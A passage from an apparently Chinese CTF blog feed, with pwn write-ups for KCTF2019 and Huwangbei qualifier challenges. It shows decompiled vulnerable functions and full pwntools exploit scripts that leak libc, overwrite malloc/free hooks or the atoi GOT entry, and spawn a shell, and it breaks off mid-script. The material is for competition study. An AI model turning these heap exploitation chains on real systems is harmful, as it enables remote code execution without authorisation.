<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx : "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p,idx,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"idx : "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'text : '</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(p,<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    heapbase = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heapbase))</span><br><span class="line">    Add(p,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">    Add(p,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">    Add(p,<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">    Add(p,<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">1</span>)</span><br><span class="line">    Edit(p,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x170</span>+<span class="number">0x70</span>))</span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(p,<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">    Add(p,<span class="number">0x58</span>)<span class="comment">#1</span></span><br><span class="line">    Edit(p,<span class="number">1</span>,<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">    Add(p,<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">    Add(p,<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Edit(p,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0x1e0</span>))</span><br><span class="line">    Delete(p,<span class="number">5</span>)</span><br><span class="line">    Add(p,<span class="number">0xf8</span><span class="number">-0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Add(p,<span class="number">0x58</span>)<span class="comment">#5</span></span><br><span class="line">    Edit(p,<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(p,<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">    Add(p,<span class="number">0x68</span>)<span class="comment">#7 target</span></span><br><span class="line">    Edit(p,<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line">    p.recvn(<span class="number">0x40</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>))- (<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    <span class="comment">#fake_chunk = libc_base + 0x3c4b0d</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#Add(p,0x88)#8</span></span><br><span class="line">    <span class="comment">#Add(p,0xf8)#9</span></span><br><span class="line">    <span class="comment">#Delete(p,0)</span></span><br><span class="line">    <span class="comment">#Edit(p,8,'a'*0x10+p64(0x71)+p64(0x71)+'a'*0x60+p64(0x1e0))</span></span><br><span class="line">    <span class="comment">#Delete(p,9)</span></span><br><span class="line">    <span class="comment">#Delete(p,8)</span></span><br><span class="line">    <span class="comment">#spare some space</span></span><br><span class="line">    Delete(p,<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#go on</span></span><br><span class="line">    Edit(p,<span class="number">4</span>,p64(libc_base+libc.symbols[<span class="string">'system'</span>])*<span class="number">0xc</span>+<span class="string">'\n'</span>)</span><br><span class="line">    fake_heap = heapbase + <span class="number">0x2f0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#chunk1 == chunk6</span></span><br><span class="line">    Add(p,<span class="number">0x100</span>)<span class="comment">#5</span></span><br><span class="line">    Edit(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+<span class="string">'\x00'</span>*<span class="number">0xa8</span>+p64(fake_heap)+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(p,<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x40</span>+<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x3c5520</span><span class="number">-0x10</span>)</span><br><span class="line">    Edit(p,<span class="number">6</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Add(p,<span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#exp(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">            p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">            p = remote(<span class="string">'154.8.174.214'</span>,<span class="number">10001</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp(p)</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure>
<h2 id="0xbird"><a href="#0xbird" class="headerlink" title="0xbird"></a>0xbird</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>出题人自己实现的malloc和hook，这种题第二次见到，只是这次的逻辑更为复杂，直接劝退了，出了wp再看感觉自己真太菜了，稍微看看其实就能搞出来的。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞在于Free之后的UAF，每个chunk的后两个8字节分别为next和prev，每次Malloc的时候根据0x602558找最近释放的块，再用prev指针找下一个空闲块，分配的时候有一个size的check，我们用UAF分配到chk_lis上面的stdout(size:0x7f)，劫持chk_list再Edit为atoi@got，最后覆写为shellcode_addr.</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./0xbird1'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./0xbird1'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'154.8.174.214'</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2019KCTF| '</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2019KCTF| '</span>)</span><br><span class="line">    p.sendline(<span class="string">'F'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">' '</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span><span class="params">(index,content,leak=False)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2019KCTF| '</span>)</span><br><span class="line">    p.sendline(<span class="string">'W'</span>)</span><br><span class="line">    addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> leak:</span><br><span class="line">        p.recvuntil(<span class="string">") 0x"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        addr = int(p.recvuntil(<span class="string">" "</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Write addr: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Write value: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Nice</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'2019KCTF| '</span>)</span><br><span class="line">    p.sendline(<span class="string">'N'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#for i in range(0xf):</span></span><br><span class="line">    <span class="comment">#    Alloc(0x20+i)#1</span></span><br><span class="line">    <span class="comment">#Alloc(0x1000)</span></span><br><span class="line">    sc = asm(shellcraft.amd64.linux.sh())</span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">    sc_addr = Write(<span class="number">1</span>,sc,<span class="literal">True</span>)</span><br><span class="line">    log.success(<span class="string">"sc addr =&gt; "</span> + hex(sc_addr))</span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#7</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Free(<span class="number">3</span>)</span><br><span class="line">    Free(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Write(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x58</span>+p64(<span class="number">0x602095</span>)*<span class="number">2</span>)</span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#8</span></span><br><span class="line">    Alloc(<span class="number">0x68</span>)<span class="comment">#9 fake</span></span><br><span class="line">    Write(<span class="number">9</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">    Write(<span class="number">1</span>,p64(sc_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">"2019KCTF| "</span>)</span><br><span class="line">    p.sendline(<span class="string">"F"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>KCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>护网杯预选赛pwn部分writeup</title>
    <url>/2020/09/03/Huwangbei/</url>
    <content><![CDATA[<h1 id="护网杯-pwn-writeup"><a href="#护网杯-pwn-writeup" class="headerlink" title="护网杯 pwn writeup"></a>护网杯 pwn writeup</h1><h2 id="mergeheap"><a href="#mergeheap" class="headerlink" title="mergeheap"></a>mergeheap</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>libc2.27，strcat连接的时候溢出改size造成overlapping，之后tcache dup改chunk的size，拿到unsorted bin泄露地址，最后tcache dup到free_hook即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Merge</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> final_size; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> idx1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> idx2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  idx1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx1 &lt; <span class="number">0</span> || idx1 &gt; <span class="number">14</span> || !qword_2020A0[idx1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  idx2 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( idx2 &lt; <span class="number">0</span> || idx2 &gt; <span class="number">14</span> || !qword_2020A0[idx2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  final_size = dword_202060[idx1] + dword_202060[idx2];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(final_size);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)qword_2020A0[i], (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_2020A0[idx1]);</span><br><span class="line">  <span class="built_in">strcat</span>((<span class="keyword">char</span> *)qword_2020A0[i], (<span class="keyword">const</span> <span class="keyword">char</span> *)qword_2020A0[idx2]);<span class="comment">// 漏洞</span></span><br><span class="line">  dword_202060[i] = final_size;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./mergeheap'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./mergeheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'49.232.101.194'</span>,<span class="number">54337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"len:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Merge</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx1:'</span>)</span><br><span class="line">    p.sendline(str(idx1))</span><br><span class="line">    p.recvuntil(<span class="string">'idx2:'</span>)</span><br><span class="line">    p.sendline(str(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'b'</span>*<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,<span class="string">'a\n'</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x78</span>)<span class="comment">#8</span></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Merge(<span class="number">0</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'b'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+<span class="string">'\n'</span>)<span class="comment"># freed 5 &amp; 6 &amp; 7</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a\n'</span>)<span class="comment">#5</span></span><br><span class="line">    Show(<span class="number">6</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7ffff7dcfca0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    Delete(<span class="number">7</span>)</span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'c'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x401</span>)+p64(free_hook)+<span class="string">'\n'</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,<span class="string">'/bin/sh\x00\n'</span>)<span class="comment">#8</span></span><br><span class="line">    Add(<span class="number">0x3f8</span>,p64(libc_base+libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)<span class="comment">#9</span></span><br><span class="line">    Delete(<span class="number">9</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>只能Add<code>0x58</code>及以下的chunk，Add的时候不会检查index位置是否为空可以直接覆写，input有off-by-one，但只有0x58的可以。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_addr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name of Size : "</span>);</span><br><span class="line">  size = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">0x58</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input index: "</span>);</span><br><span class="line">    idx = read_int();</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk_addr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_2020A8[<span class="number">4</span> * idx] = size;</span><br><span class="line">      *((_QWORD *)&amp;unk_2020A0 + <span class="number">2</span> * idx) = chunk_addr;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"input flower name:"</span>);</span><br><span class="line">      get_input(*((_BYTE **)&amp;unk_2020A0 + <span class="number">2</span> * idx), size);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_input</span><span class="params">(_BYTE *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">0x58</span> )</span><br><span class="line">    a1[<span class="number">0x58</span>] = <span class="number">0</span>;                               <span class="comment">// off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里输入choice时使用scanf，因为scanf是用malloc分配的缓冲区，在输入数据量大的时候会进行chunk的合并操作，合并之后的chunk会被放入smallbin，分配的时候会先看smallbin，不合适用top_chunk分配。</p>
<p>泄露libc:释放几个chunk，scanf输入大量数据最后merge得到unsorted bin，分配一个chunk用Show即可泄露Libc。</p>
<p>get shell：开始先用chunk shrink，改了size之后发现smallbin报的size error，之后以为这个构造有问题，于是改成了chunk extend，结果merge的时候好像不会合并或者出问题（总之是自己操作不太行）。最后还是改回chunk shrink，构造后面的fake_prev_size和fake_size，最后构造拿到Overlap chunk制造double free，地址开随机化的话heap前一个字节为0x55或0x56，0x56对应fastbin[0x50]，free一个0x28的块，在main_arena里malloc到这个块0x56打头为size的块，修改main_arena的top_chunk到malloc_hook附近的块，这里选的是0x25，malloc到这个块修改realloc_hook为one_gadget，malloc_hook为realloc+x，偏移和gadget自己调整一下，最后拿shell。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = 